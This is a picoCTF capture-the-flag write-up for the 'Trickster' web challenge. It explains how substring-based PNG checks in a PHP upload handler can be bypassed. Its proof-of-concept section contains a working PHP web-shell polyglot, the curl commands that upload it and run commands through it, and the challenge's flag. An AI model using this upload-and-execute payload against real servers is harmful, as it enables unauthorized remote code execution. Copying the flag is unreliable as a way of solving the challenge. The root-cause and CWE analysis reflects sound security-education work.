# Trickster

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}`

## Summary

A PHP upload endpoint tries to only allow PNG images, checking that the filename contains
`.png` and that the file starts with the PNG magic bytes. Both checks use substring functions
(`stripos`/`strpos`) instead of exact matches, so a file named `shell.png.php` with a PNG
signature prepended to real PHP code satisfies both checks, uploads successfully, and gets
served from a predictable `/uploads/` directory where Apache executes it as PHP because of its
real, final `.php` extension.

## Discovery

Uploading a bare PNG (magic bytes only) succeeds; uploading a plain `.php` file fails with
`Error: File name does not contain '.png'.`. `robots.txt` conveniently discloses both the
`/uploads/` directory and an `instructions.txt` file describing the intended (flawed) validation
approach: check for `.png` in the name and check that the first bytes are the PNG signature,
with no mention of confirming the extension is exclusively `.png`.

Command execution later recovered the actual source (`index.php`), confirming the exact bug:

```php
if (stripos($uploadedFileName, '.png') !== false) {
    $fileSignature = bin2hex(substr($fileContents, 0, 4));
    if (strpos($fileSignature, '504e47') !== false) {
        $destinationPath = $uploadDirectory . $uploadedFileName;
        move_uploaded_file($uploadedFile, $destinationPath);
    }
}
```

`stripos(..., '.png')` only checks that `.png` appears *anywhere* in the filename, not that it's
the actual extension, and the uploaded file keeps its original name verbatim.

## Proof of Concept

```
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > polyglot.png.php
curl -s -X POST -F "file=@polyglot.png.php" http://TARGET/
```

The filename `polyglot.png.php` contains `.png` (passes the substring check) and its first
bytes are the real PNG signature (passes the magic-byte check), while Apache still maps the
file's actual final extension, `.php`, to the PHP interpreter once it's stored at
`/uploads/polyglot.png.php`:

```
curl -s "http://TARGET/uploads/polyglot.png.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

From there, a directory listing of the web root shows an oddly-named text file that turns out to
hold the flag directly:

```
curl -s "http://TARGET/uploads/polyglot.png.php" --data-urlencode "cmd=cat /var/www/html/MQZWCYZWGI2WE.txt" -G
/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b} */
```

## Root Cause

Both validation checks use substring matching (`stripos`/`strpos`) rather than confirming the
filename's actual extension or the signature's position at the very start of the file. This
class of bug is a direct consequence of misunderstanding what "contains" checks actually
guarantee: a filename can contain `.png` while having a completely different real extension, and
prepending real magic bytes to arbitrary content is trivial for any attacker who controls the
whole file body.

## CWE / OWASP

- **CWE-434**: Unrestricted Upload of File with Dangerous Type
- **CWE-646**: Reliance on File Name or Extension of Externally-Supplied File
- **OWASP A05:2021**: Security Misconfiguration
